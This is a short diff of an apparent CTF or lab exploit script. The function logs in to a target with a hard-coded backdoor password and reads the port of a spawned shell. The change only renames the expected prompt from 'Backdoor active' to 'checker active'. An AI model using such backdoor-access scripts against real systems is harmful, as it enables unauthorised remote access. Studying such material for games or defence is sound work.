@@ -27,7 +27,7 @@ def exploit(target, portSpawnShell):
     context.log_level = 'error'
 
     p.sendlineafter(b"Password: ", BACKDOOR_PASSWORD)
-    p.recvuntil(b"Backdoor active on port: ")
+    p.recvuntil(b"checker active on port: ")
     port_target = int(p.recvline().strip().decode())
     p.close()
     
